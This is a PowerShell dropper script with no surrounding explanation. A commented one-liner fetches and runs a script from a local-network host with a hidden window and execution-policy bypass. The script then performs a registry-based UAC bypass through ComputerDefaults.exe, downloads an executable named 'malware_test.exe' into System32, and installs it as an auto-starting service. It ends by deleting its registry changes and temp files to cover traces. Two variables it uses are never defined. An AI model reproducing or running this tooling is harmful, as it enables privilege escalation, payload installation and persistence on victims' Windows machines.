#powershell -NoP -NonI -W h -Exec Bypass md "$env:userprofile\temp"; iwr "http://192.168.71.1:3000/get-file/1.ps1"  -outfile "$env:userprofile\temp\1.ps1"; cd $env:userprofile\temp; & .\1.ps1

function Is-Admin {
    return [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}

function Download-FileIfNotExist {
    param (
        [string]$Url,
        [string]$Path
    )

    if (-not (Test-Path $Path)) {
        Write-Host "File not found at $Path. Downloading..."
        Invoke-WebRequest -Uri $Url -OutFile $Path
    }
    else {
        Write-Host "File already exists at $Path."
    }
}

$serviceFileUrl = "http://192.168.71.1:3000/get-file/malware_test.exe" # Replace with your actual file URL
$scriptPath = $MyInvocation.MyCommand.Definition
$serviceFilePath = Join-Path "C:\Windows\System32\test" "malware_test.exe"

# If not running as admin, perform UAC bypass
if (-not (Is-Admin)) {
    # Setting up the registry for UAC bypass
    New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
    New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell -NonI -W h -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force

    # Executing the bypass
    Start-Process "C:\Windows\System32\ComputerDefaults.exe"

    # Exit the current script
    exit
}

New-Item -Path "C:\Windows\System32\test" -Type Directory

Download-FileIfNotExist -Url $serviceFileUrl -Path $serviceFilePath
Download-FileIfNotExist -Url $secondScriptUrl -Path $secondScriptPath

Remove-Item -Recurse -Force "$env:userprofile\temp"

New-Service -Name "TestService" -BinaryPathName $serviceFilePath -StartupType Automatic
Start-Service -Name "TestService"
Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
